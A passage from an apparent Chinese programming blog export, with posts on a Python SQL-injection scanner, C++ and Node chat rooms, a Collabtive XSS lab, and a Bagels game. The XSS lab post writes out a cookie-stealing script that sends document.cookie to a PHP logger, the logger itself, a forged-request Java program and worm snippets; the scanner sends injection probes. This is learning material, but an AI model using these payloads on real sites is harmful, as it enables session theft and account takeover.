very good girl']]></content>
      <categories>
        <category>python</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python builds vulnerability scanner]]></title>
    <url>%2F2018%2F10%2F05%2FPython-builds-vulnerability-scanner%2F</url>
    <content type="text"><![CDATA[主要文件目录：|–lib—-|—core—–|—Download.py| | |—plugin.py| | |—Spider.py| | |—UrlManager.py| || |—init.py|||–script—-|—email_check.py| || |—sqlcheck.py|–w8ay.py (这里只给出了关键的的代码) w8ay.py12345678910111213141516171819#!/usr/bin/env python#-*- coding:utf-8 -*-'''Name:w8ayScanAuthor:w8ayCopyright (c) 2017'''import sysfrom lib.core.Spider import SpiderMaindef main(): root = "https://www.shiyanlou.com/" threadNum = 10 #spider w8 = SpiderMain(root,threadNum) w8.craw()if __name__ == '__main__': main() email_check.py123456789101112#!/usr/bin/env python# __author__= 'w8ay'import reclass spider(): def run(self,url,html): #print(html) pattern = re.compile(r'([\w-]+@[\w-]+\.[\w-]+)+') email_list = re.findall(pattern, html) if(email_list): print(email_list) return True return False sqlcheck.py123456789101112131415161718192021222324252627282930313233343536import re,randomfrom lib.core import Downloadclass spider: def run(self,url,html): if(not url.find("?")): return False Downloader = Download.Downloader() BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)") DBMS_ERRORS = &#123;# regular expressions used for DBMS recognition based on error message response "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."), "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."), "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]&#123;8&#125;", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."), "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"), "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"), "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("), "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"), "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"), &#125; _url = url + "%29%28%22%27" _content = Downloader.get(_url) for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]): if(re.search(regex,_content)): print "sql fonud: %"%url return True content = &#123;&#125; content["origin"] = Downloader.get(_url) for test_payload in BOOLEAN_TESTS: RANDINT = random.randint(1, 255) _url = url + test_payload%(RANDINT,RANDINT) content["true"] = Downloader.get(_url) _url = url + test_payload%(RANDINT,RANDINT+1) content["false"] = Downloader.get(_url) if content["origin"]==content["true"]!=content["false"]: print "sql fonud: %"%url return True Download.py12345678910111213141516171819202122232425262728293031#!/usr/bin/env python#-*- coding:utf-8 -*-import requestsclass Downloader(object): def get(self,url): r = requests.get(url,timeout=10) if r.status_code != 200: return None _str = r.text return _str def post(self,url,data): r = requests.post(url,data) _str = r.text return _str def download(self, url,htmls): if url is None: return None _str = &#123;&#125; _str["url"] = url try: r = requests.get(url, timeout=10) if r.status_code != 200: return None _str["html"] = r.text except Exception as e: return None htmls.append(_str) Plugin.py1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# __author__= 'w8ay'import osimport sysclass spiderplus(object): def __init__(self,plugin,disallow=[]): self.dir_exploit = [] self.disallow = ['__init__'] self.disallow.extend(disallow) self.plugin = os.getcwd()+'/' +plugin sys.path.append(plugin) def list_plusg(self): def filter_func(file): if not file.endswith(".py"): return False for disfile in self.disallow: if disfile in file: return False return True dir_exploit = filter(filter_func, os.listdir(self.plugin)) return list(dir_exploit) def work(self,url,html): for _plugin in self.list_plusg(): try: m = __import__(_plugin.split('.')[0]) spider = getattr(m, 'spider') p = spider() s =p.run(url,html) except Exception,e: print e Spider.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env python#-*- coding:utf-8 -*-from lib.core import Download,UrlManager,pluginimport threadingfrom urlparse import urljoinfrom bs4 import BeautifulSoupfrom script import sqlcheckimport sysclass SpiderMain(object): def __init__(self,root,threadNum): self.urls = UrlManager.UrlManager() self.download = Download.Downloader() self.root = root self.threadNum = threadNum def _judge(self, domain, url): if (url.find(domain) != -1): return True else: return False def _parse(self,page_url,content): if content is None: return soup = BeautifulSoup(content, 'html.parser') _news = self._get_new_urls(page_url,soup) return _news def _get_new_urls(self, page_url,soup): new_urls = set() links = soup.find_all('a') for link in links: new_url = link.get('href') new_full_url = urljoin(page_url, new_url) if(self._judge(self.root,new_full_url)): new_urls.add(new_full_url) return new_urls def craw(self): self.urls.add_new_url(self.root) while self.urls.has_new_url(): _content = [] th = [] for i in list(range(self.threadNum)): if self.urls.has_new_url() is False: break new_url = self.urls.get_new_url() ##sql check # try: # if(sqlcheck.sqlcheck(new_url)): # print("url:%s sqlcheck is valueable"%new_url) # except: # pass print("craw:" + new_url) t = threading.Thread(target=self.download.download,args=(new_url,_content)) t.start() th.append(t) for t in th: t.join() for _str in _content: if _str is None: continue new_urls = self._parse(new_url,_str["html"]) disallow = ["sqlcheck"] _plugin = plugin.spiderplus("script",disallow) _plugin.work(_str["url"],_str["html"]) self.urls.add_new_urls(new_urls) UrlManger.py123456789101112131415161718192021222324252627#!/usr/bin/env python#-*- coding:utf-8 -*-class UrlManager(object): def __init__(self): self.new_urls = set() self.old_urls = set() def add_new_url(self, url): if url is None: return if url not in self.new_urls and url not in self.old_urls: self.new_urls.add(url) def add_new_urls(self, urls): if urls is None or len(urls) == 0: return for url in urls: self.add_new_url(url) def has_new_url(self): return len(self.new_urls) != 0 def get_new_url(self): new_url = self.new_urls.pop() self.old_urls.add(new_url) return new_url]]></content>
      <categories>
        <category>python</category>
        <category>security</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ implements instant messaging software]]></title>
    <url>%2F2018%2F10%2F04%2FC-implements-instant-messaging-software%2F</url>
    <content type="text"><![CDATA[主要代码： common.h:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#ifndef CHATROOM_COMMON_H#define CHATROOM_COMMON_H#include &lt;iostream&gt;#include &lt;list&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// 默认服务器端IP地址#define SERVER_IP "127.0.0.1"// 服务器端口号#define SERVER_PORT 8888// int epoll_create(int size)中的size// 为epoll支持的最大句柄数#define EPOLL_SIZE 5000// 缓冲区大小65535#define BUF_SIZE 0xFFFF // 新用户登录后的欢迎信息#define SERVER_WELCOME "Welcome you join to the chat room! Your chat ID is: Client #%d"// 其他用户收到消息的前缀#define SERVER_MESSAGE "ClientID %d say &gt;&gt; %s"// 退出系统#define EXIT "EXIT"// 提醒你是聊天室中唯一的客户#define CAUTION "There is only one int the char room!"// 注册新的fd到epollfd中// 参数enable_et表示是否启用ET模式，如果为True则启用，否则使用LT模式static void addfd( int epollfd, int fd, bool enable_et )&#123; struct epoll_event ev; ev.data.fd = fd; ev.events = EPOLLIN; if( enable_et ) ev.events = EPOLLIN | EPOLLET; epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &amp;ev); // 设置socket为nonblocking模式 // 执行完就转向下一条指令，不管函数有没有返回。 fcntl(fd, F_SETFL, fcntl(fd, F_GETFD, 0)| O_NONBLOCK); printf("fd added to epoll!\n\n");&#125;#endif // CHATROOM_COMMON_H server.cpp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193#include &lt;iostream&gt;#include "Server.h"using namespace std;// 服务端类成员函数// 服务端类构造函数Server::Server()&#123; // 初始化服务器地址和端口 serverAddr.sin_family = PF_INET; serverAddr.sin_port = htons(SERVER_PORT); serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP); // 初始化socket listener = 0; // epool fd epfd = 0;&#125;// 初始化服务端并启动监听void Server::Init() &#123; cout &lt;&lt; "Init Server..." &lt;&lt; endl; //创建监听socket listener = socket(PF_INET, SOCK_STREAM, 0); if(listener &lt; 0) &#123; perror("listener"); exit(-1);&#125; //绑定地址 if( bind(listener, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr)) &lt; 0) &#123; perror("bind error"); exit(-1); &#125; //监听 int ret = listen(listener, 5); if(ret &lt; 0) &#123; perror("listen error"); exit(-1); &#125; cout &lt;&lt; "Start to listen: " &lt;&lt; SERVER_IP &lt;&lt; endl; //在内核中创建事件表 epfd = epoll_create(EPOLL_SIZE); if(epfd &lt; 0) &#123; perror("epfd error"); exit(-1); &#125; //往事件表里添加监听事件 addfd(epfd, listener, true);&#125;// 关闭服务，清理并关闭文件描述符void Server::Close() &#123; //关闭socket close(listener); //关闭epoll监听 close(epfd);&#125;// 发送广播消息给所有客户端int Server::SendBroadcastMessage(int clientfd)&#123; // buf[BUF_SIZE] 接收新消息 // message[BUF_SIZE] 保存格式化的消息 char buf[BUF_SIZE], message[BUF_SIZE]; bzero(buf, BUF_SIZE); bzero(message, BUF_SIZE); // 接收新消息 cout &lt;&lt; "read from client(clientID = " &lt;&lt; clientfd &lt;&lt; ")" &lt;&lt; endl; int len = recv(clientfd, buf, BUF_SIZE, 0); // 如果客户端关闭了连接 if(len == 0) &#123; close(clientfd); // 在客户端列表中删除该客户端 clients_list.remove(clientfd); cout &lt;&lt; "ClientID = " &lt;&lt; clientfd &lt;&lt; " closed.\n now there are " &lt;&lt; clients_list.size() &lt;&lt; " client in the char room" &lt;&lt; endl; &#125; // 发送广播消息给所有客户端 else &#123; // 判断是否聊天室还有其他客户端 if(clients_list.size() == 1) &#123; // 发送提示消息 send(clientfd, CAUTION, strlen(CAUTION), 0); return len; &#125; // 格式化发送的消息内容 sprintf(message, SERVER_MESSAGE, clientfd, buf); // 遍历客户端列表依次发送消息，需要判断不要给来源客户端发 list&lt;int&gt;::iterator it; for(it = clients_list.begin(); it != clients_list.end(); ++it) &#123; if(*it != clientfd)&#123; if( send(*it, message, BUF_SIZE, 0) &lt; 0 ) &#123; return -1; &#125; &#125; &#125; &#125; return len;&#125;// 启动服务端void Server::Start() &#123; // epoll 事件队列 static struct epoll_event events[EPOLL_SIZE]; // 初始化服务端 Init(); //主循环 while(1) &#123; //epoll_events_count表示就绪事件的数目 int epoll_events_count = epoll_wait(epfd, events, EPOLL_SIZE, -1); if(epoll_events_count &lt; 0) &#123; perror("epoll failure"); break; &#125; cout &lt;&lt; "epoll_events_count =\n" &lt;&lt; epoll_events_count &lt;&lt; endl; //处理这epoll_events_count个就绪事件 for(int i = 0; i &lt; epoll_events_count; ++i) &#123; int sockfd = events[i].data.fd; //新用户连接 if(sockfd == listener) &#123; struct sockaddr_in client_address; socklen_t client_addrLength = sizeof(struct sockaddr_in); int clientfd = accept( listener, ( struct sockaddr* )&amp;client_address, &amp;client_addrLength ); cout &lt;&lt; "client connection from: " &lt;&lt; inet_ntoa(client_address.sin_addr) &lt;&lt; ":" &lt;&lt; ntohs(client_address.sin_port) &lt;&lt; ", clientfd = " &lt;&lt; clientfd &lt;&lt; endl; addfd(epfd, clientfd, true); // 服务端用list保存用户连接 clients_list.push_back(clientfd); cout &lt;&lt; "Add new clientfd = " &lt;&lt; clientfd &lt;&lt; " to epoll" &lt;&lt; endl; cout &lt;&lt; "Now there are " &lt;&lt; clients_list.size() &lt;&lt; " clients int the chat room" &lt;&lt; endl; // 服务端发送欢迎信息 cout &lt;&lt; "welcome message" &lt;&lt; endl; char message[BUF_SIZE]; bzero(message, BUF_SIZE); sprintf(message, SERVER_WELCOME, clientfd); int ret = send(clientfd, message, BUF_SIZE, 0); if(ret &lt; 0) &#123; perror("send error"); Close(); exit(-1); &#125; &#125; //处理用户发来的消息，并广播，使其他用户收到信息 else &#123; int ret = SendBroadcastMessage(sockfd); if(ret &lt; 0) &#123; perror("error"); Close(); exit(-1); &#125; &#125; &#125; &#125; // 关闭服务 Close();&#125; server.h123456789101112131415161718192021222324252627282930313233343536373839404142434445#ifndef CHATROOM_SERVER_H#define CHATROOM_SERVER_H#include &lt;string&gt;#include "Common.h"using namespace std;// 服务端类，用来处理客户端请求class Server &#123;public: // 无参数构造函数 Server(); // 初始化服务器端设置 void Init(); // 关闭服务 void Close(); // 启动服务端 void Start();private: // 广播消息给所有客户端 int SendBroadcastMessage(int clientfd); // 服务器端serverAddr信息 struct sockaddr_in serverAddr; //创建监听的socket int listener; // epoll_create创建后的返回值 int epfd; // 客户端列表 list&lt;int&gt; clients_list;&#125;;#endif //CHATROOM_SERVER_H client.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#include &lt;iostream&gt;#include "Client.h"using namespace std;// 客户端类成员函数// 客户端类构造函数Client::Client()&#123; // 初始化要连接的服务器地址和端口 serverAddr.sin_family = PF_INET; serverAddr.sin_port = htons(SERVER_PORT); serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP); // 初始化socket sock = 0; // 初始化进程号 pid = 0; // 客户端状态 isClientwork = true; // epool fd epfd = 0;&#125;// 连接服务器void Client::Connect() &#123; cout &lt;&lt; "Connect Server: " &lt;&lt; SERVER_IP &lt;&lt; " : " &lt;&lt; SERVER_PORT &lt;&lt; endl; // 创建socket sock = socket(PF_INET, SOCK_STREAM, 0); if(sock &lt; 0) &#123; perror("sock error"); exit(-1); &#125; // 连接服务端 if(connect(sock, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr)) &lt; 0) &#123; perror("connect error"); exit(-1); &#125; // 创建管道，其中fd[0]用于父进程读，fd[1]用于子进程写 if(pipe(pipe_fd) &lt; 0) &#123; perror("pipe error"); exit(-1); &#125; // 创建epoll epfd = epoll_create(EPOLL_SIZE); if(epfd &lt; 0) &#123; perror("epfd error"); exit(-1); &#125; //将sock和管道读端描述符都添加到内核事件表中 addfd(epfd, sock, true); addfd(epfd, pipe_fd[0], true);&#125;// 断开连接，清理并关闭文件描述符void Client::Close() &#123; if(pid)&#123; //关闭父进程的管道和sock close(pipe_fd[0]); close(sock); &#125;else&#123; //关闭子进程的管道 close(pipe_fd[1]); &#125;&#125;// 启动客户端void Client::Start() &#123; // epoll 事件队列 static struct epoll_event events[2]; // 连接服务器 Connect(); // 创建子进程 pid = fork(); // 如果创建子进程失败则退出 if(pid &lt; 0) &#123; perror("fork error"); close(sock); exit(-1); &#125; else if(pid == 0) &#123; // 进入子进程执行流程 //子进程负责写入管道，因此先关闭读端 close(pipe_fd[0]); // 输入exit可以退出聊天室 cout &lt;&lt; "Please input 'exit' to exit the chat room" &lt;&lt; endl; // 如果客户端运行正常则不断读取输入发送给服务端 while(isClientwork)&#123; bzero(&amp;message, BUF_SIZE); fgets(message, BUF_SIZE, stdin); // 客户输出exit,退出 if(strncasecmp(message, EXIT, strlen(EXIT)) == 0)&#123; isClientwork = 0; &#125; // 子进程将信息写入管道 else &#123; if( write(pipe_fd[1], message, strlen(message) - 1 ) &lt; 0 ) &#123; perror("fork error"); exit(-1); &#125; &#125; &#125; &#125; else &#123; //pid &gt; 0 父进程 //父进程负责读管道数据，因此先关闭写端 close(pipe_fd[1]); // 主循环(epoll_wait) while(isClientwork) &#123; int epoll_events_count = epoll_wait( epfd, events, 2, -1 ); //处理就绪事件 for(int i = 0; i &lt; epoll_events_count ; ++i) &#123; bzero(&amp;message, BUF_SIZE); //服务端发来消息 if(events[i].data.fd == sock) &#123; //接受服务端消息 int ret = recv(sock, message, BUF_SIZE, 0); // ret= 0 服务端关闭 if(ret == 0) &#123; cout &lt;&lt; "Server closed connection: " &lt;&lt; sock &lt;&lt; endl; close(sock); isClientwork = 0; &#125; else &#123; cout &lt;&lt; message &lt;&lt; endl; &#125; &#125; //子进程写入事件发生，父进程处理并发送服务端 else &#123; //父进程从管道中读取数据 int ret = read(events[i].data.fd, message, BUF_SIZE); // ret = 0 if(ret == 0) isClientwork = 0; else &#123; // 将信息发送给服务端 send(sock, message, BUF_SIZE, 0); &#125; &#125; &#125;//for &#125;//while &#125; // 退出进程 Close();&#125; client.h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#ifndef CHATROOM_CLIENT_H#define CHATROOM_CLIENT_H#include &lt;string&gt;#include "Common.h"using namespace std;// 客户端类，用来连接服务器发送和接收消息class Client &#123;public: // 无参数构造函数 Client(); // 连接服务器 void Connect(); // 断开连接 void Close(); // 启动客户端 void Start();private: // 当前连接服务器端创建的socket int sock; // 当前进程ID int pid; // epoll_create创建后的返回值 int epfd; // 创建管道，其中fd[0]用于父进程读，fd[1]用于子进程写 int pipe_fd[2]; // 表示客户端是否正常工作 bool isClientwork; // 聊天信息缓冲区 char message[BUF_SIZE]; //用户连接的服务器 IP + port struct sockaddr_in serverAddr;&#125;;#endif //CHATROOM_CLIENT_H clientMain.cpp123456789#include "Server.h"// 服务端主函数// 创建服务端对象后启动服务端int main(int argc, char *argv[]) &#123; Server server; server.Start(); return 0;&#125; Makefile123456789101112131415CC = g++CFLAGS = -std=c++11all: ClientMain.cpp ServerMain.cpp Server.o Client.o $(CC) $(CFLAGS) ServerMain.cpp Server.o -o chatroom_server $(CC) $(CFLAGS) ClientMain.cpp Client.o -o chatroom_clientServer.o: Server.cpp Server.h Common.h $(CC) $(CFLAGS) -c Server.cppClient.o: Client.cpp Client.h Common.h $(CC) $(CFLAGS) -c Client.cppclean: rm -f *.o chatroom_server chatroom_client 测试结果：server: client 1: client 2: 做的时候突然想到了以前做过的一个和这个很相似的东西，只不过上次做的时候使用node js来做的这次使用c++来实现的。 index.html1234567891011121314151617181920212223242526272829303132333435363738&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; box-sizing: border-box; &#125; body &#123; font: 13px Helvetica, Arial; &#125; form &#123; background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; &#125; form input &#123; border: 0; padding: 10px; width: 90%; margin-right: .5%; &#125; form button &#123; width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; &#125; #messages &#123; list-style-type: none; margin: 0; padding: 0; &#125; #messages li &#123; padding: 5px 10px; &#125; #messages li:nth-child(odd) &#123; background: #eee; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;ul id="messages"&gt;&lt;/ul&gt; &lt;form action=""&gt; &lt;input id="m" autocomplete="off" /&gt;&lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt; &lt;script src="https://code.jquery.com/jquery-1.11.1.js"&gt;&lt;/script&gt; &lt;script&gt; $(function () &#123; var socket = io(); $('form').submit(function()&#123; socket.emit('chat message', $('#m').val()); $('#m').val(''); return false; &#125;); socket.on('chat message', function(msg)&#123; $('#messages').append($('&lt;li&gt;').text(msg)); &#125;); &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; index.js12345678910111213141516171819202122232425var app = require('express')();var http = require('http').Server(app);var io = require('socket.io')(http);app.get('/', function(req, res)&#123; res.sendFile(__dirname + '/index.html');&#125;);io.on('connection', function(socket)&#123; socket.broadcast.emit('hi'); console.log('a user connected'); socket.on('disconnect', function()&#123; console.log('user disconnected'); &#125;); socket.on('chat message', function(msg)&#123; console.log('message: ' + msg); io.emit('chat message', msg); &#125;);&#125;);io.emit('some event', &#123;for: 'everyone'&#125;);http.listen(3000, function()&#123; console.log('listening on 127.0.0.1:3000');&#125;); package.json123456&#123; "name": "socket-chat-example", "version": "0.0.1", "description": "my first socket.io app", "dependencies": &#123;&#125;&#125; 记得安装这两个模块： npm install –save express@4.15.2 npm install –save socket.io]]></content>
      <categories>
        <category>c++</category>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Collabtive and XSS]]></title>
    <url>%2F2018%2F10%2F04%2FXSS%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146sudo vim /etc/hostssudo vim /etc/apache2/conf.d/lab.conf&lt;VirtualHost *&gt;ServerName http://www.xsslabcollabtive.comDocumentRoot /var/www/XSS/Collabtive/&lt;/VirtualHost&gt;sudo service apache2 startsudo mysqld_safecd /var/www/XSS/Collabtive/sudo vim js.html&lt;script&gt;alert('xss');&lt;/script&gt;sudo vim myscript.jsalert('xss');sudo vim include.html&lt;script type="text/javascript" src="http://www.xsslabcollabtive.com/myscript.js"&gt;&lt;/script&gt;sudo vim /var/www/XSS/Collabtive/manageuser.phpsudo vim hack.phpsudo vim hack.php&lt;?php$cookie = $_GET['c'];$log = fopen("cookie.txt","a");fwrite($log,$cookie ."\n");fclose($log);?&gt;shiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ touch cookie.txtshiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ sudo chmod 777 cookie.txtecho "&lt;script&gt;document.write('&lt;img src=http://www.xsslabcollabtive.com/hack.php?c=' + escape(document.cookie) + '&gt;');&lt;/script&gt;";受害者访问 www.xsslabcollabtive.com/manageuser.php 页面：cd /home/shiyanlouwget http://labfile.oss.aliyuncs.com/courses/304/live_http_headers.xpiinstall Live HTTP headers tool in firefoximport java.io.*;import java.net.*;public class HTTPSimpleForge &#123;public static void main(String[] args) throws IOException &#123;try &#123;int responseCode;InputStream responseIn=null;// URL to be forged.URL url = new URL ("http://www.xsslabcollabtive.com/admin.php?action=addpro");// URLConnection instance is created to further parameterize a// resource request past what the state members of URL instance// can represent.URLConnection urlConn = url.openConnection();if (urlConn instanceof HttpURLConnection) &#123;urlConn.setConnectTimeout(60000);urlConn.setReadTimeout(90000);&#125;// addRequestProperty method is used to add HTTP Header Information.// Here we add User-Agent HTTP header to the forged HTTP packet.// Add other necessary HTTP Headers yourself. Cookies should be stolen// using the method in task3.urlConn.addRequestProperty("User-agent","Sun JDK 1.6");//HTTP Post Data which includes the information to be sent to the server.String data="name=test&amp;desc=test...&amp;assignto[]=...&amp;assignme=1";// DoOutput flag of URL Connection should be set to true// to send HTTP POST message.urlConn.setDoOutput(true);// OutputStreamWriter is used to write the HTTP POST data// to the url connection.OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());wr.write(data);wr.flush();// HttpURLConnection a subclass of URLConnection is returned by// url.openConnection() since the url is an http request.if (urlConn instanceof HttpURLConnection) &#123;HttpURLConnection httpConn = (HttpURLConnection) urlConn;// Contacts the web server and gets the status code from// HTTP Response message.responseCode = httpConn.getResponseCode();System.out.println("Response Code = " + responseCode);// HTTP status code HTTP_OK means the response was// received sucessfully.if (responseCode == HttpURLConnection.HTTP_OK) &#123;//Laboratory for Computer Security Education 6// Get the input stream from url connection object.responseIn = urlConn.getInputStream();// Create an instance for BufferedReader// to read the response line by line.BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));String inputLine;while((inputLine = buf_inp.readLine())!=null) &#123;System.out.println(inputLine);&#125;&#125;&#125;&#125; catch (MalformedURLException e) &#123;e.printStackTrace();&#125;&#125;&#125;--------------------XSS蠕虫sudo vim test.jssudo vim test1.jsvar on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",//定义一个新的Ajax.PeriodicalUpdater&#123;method:'get',onSuccess:function(transport)&#123;alert(transport.responseText);&#125;,frequence:1000&#125;//请求方式为get，频率为1000自动传播的蠕虫：sudo vim xss_worm.jsvar strCode = document.getElementById("worm");alert(strCode.innerHTML);调用蠕虫：sudo vim worm.html&lt;script type='text/javascript' src='http://www.xsslabcollabtive.com/xss_worm.js'&gt;&lt;/script&gt;-------------------------XSS防御sudo vim /var/www/XSS/Collabtive/include/initfunctions.php 我这里只记录的整个实验的大致过程，要想要了解更多，请到实验楼官网学习。]]></content>
      <categories>
        <category>secrity</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bagels]]></title>
    <url>%2F2018%2F10%2F03%2FBagels%2F</url>
    <content type="text"><![CDATA[python code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8import randomNUM_DIGITS = 3MAX_GUESS = 10def getSecretNum(): # 返回一个由 NUM_DIGITS 个不重复随机数组成的字符串 numbers = list(range(10)) random.shuffle(numbers) secretNum = '' for i in range(NUM_DIGITS): secretNum += str(numbers[i]) return secretNumdef getClues(guess, secretNum): # 返回一个由 Pico, Fermi 和 Bagels 组成的，用来提示用户的字符串 if guess == secretNum: return 'You got it!' clues = [] for i in range(len(guess)): if guess[i] == secretNum[i]: clues.append('Fermi') elif guess[i] in secretNum: clues.append('Pico') if len(clues) == 0: return 'Bagels' clues.sort() return ' '.join(clues)def isOnlyDigits(num): # 如果字符串只包含数字，返回真。否则返回假 if num == '': return False for i in num: if i not in '0 1 2 3 4 5 6 7 8 9'.split(): return False return Trueprint('I am thinking of a %s-digit number. Try to guess what it is.' % (NUM_DIGITS))print('The clues I give are...')print('When I say: That means:')print(' Bagels None of the digits is correct.')print(' Pico One digit is correct but in the wrong position.')print(' Fermi One digit is correct and in the right position.')while True: secretNum = getSecretNum() print('I have thought up a number. You have %s guesses to get it.' % (MAX_GUESS)) guessesTaken = 1 while guessesTaken &lt;= MAX_GUESS: guess = '' while len(guess) != NUM_DIGITS or not isOnlyDigits(guess): print('Guess #%s: ' % (guessesTaken)) guess = input() print(getClues(guess, secretNum)) guessesTaken += 1 if guess == secretNum: break if guessesTaken &gt; MAX_GUESS: print('You ran out of guesses. The answer was %s.' % (secretNum)) print('Do you want to play again? (yes or no)') if not input().lower().startswith('y'): break 自己又动手写了一个C++版的 c++ code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;ctime&gt;#include &lt;cstdlib&gt;#include &lt;set&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;const int num_digits = 3;const int count_nums = 10;int match;using namespace std;string getNum() &#123; string str; while (1) &#123; bool flag = true; cin &gt;&gt; str; if (str.length() != num_digits) &#123; cout &lt;&lt; "your input format error!" &lt;&lt; endl; cout &lt;&lt; "Please input a " &lt;&lt; num_digits &lt;&lt; "digits number." &lt;&lt; endl; continue; &#125; for (int i = 0; i &lt; str.length(); ++i) &#123; if (str[i] &lt; '0' || str[i] &gt; '9') &#123; cout &lt;&lt; "your input format error!" &lt;&lt; endl; cout &lt;&lt; "Please input a " &lt;&lt; num_digits &lt;&lt; "digits number." &lt;&lt; endl; flag = false; break; &#125; &#125; if (flag) return str; &#125;&#125;string getGoalNum() &#123; set&lt;int&gt; s; srand(time(NULL)); while (s.size() != num_digits) &#123; int random_number = std::rand() % 10; if (s.size() == num_digits-1 &amp;&amp; random_number == 0) continue; s.insert(random_number); &#125; string goal_num = ""; set&lt;int&gt;::iterator it; for (it = s.begin(); it != s.end(); ++it) &#123; goal_num = to_string(*it) + goal_num; &#125; s.clear(); return goal_num;&#125;void cmp(string guess_num, string goal_num) &#123; int len1 = guess_num.length(); int len2 = goal_num.length(); string str1 = guess_num; string str2 = goal_num; bool flag; match = 0; vector&lt;string&gt; v; for (int i = 0; i &lt; len1; ++i) &#123; flag = true; for (int j = 0; j &lt; len2; ++j) &#123; if (i == j &amp;&amp; str1[i] == str2[j]) &#123; v.push_back("Fermi"); flag = false; break; &#125; else if (str1[i] == str2[j]) &#123; v.push_back("Pico"); flag = false; break; &#125; &#125; if (flag) &#123; v.push_back("Bagels"); &#125; &#125; sort(v.begin(), v.end()); for (int i = 0; i &lt; v.size(); ++i) &#123; cout &lt;&lt; v[i] &lt;&lt; " "; if (v[i] == "Fermi") match++; &#125; cout &lt;&lt; endl; if (match == num_digits) cout &lt;&lt; "You get it!!!" &lt;&lt; endl; else cout &lt;&lt; endl; v.clear();&#125;void init() &#123; cout &lt;&lt; "I am thinking of a " &lt;&lt; num_digits &lt;&lt; "-digit number. Try to guess what it is." &lt;&lt; endl; cout &lt;&lt; "The clues I give are..." &lt;&lt; endl; cout &lt;&lt; "When I say: That means:" &lt;&lt; endl; cout &lt;&lt; " Bagels None of the digits is correct." &lt;&lt; endl; cout &lt;&lt; " Pico One digit is correct but in the wrong position." &lt;&lt; endl; cout &lt;&lt; " Fermi One digit is correct and in the right position." &lt;&lt; 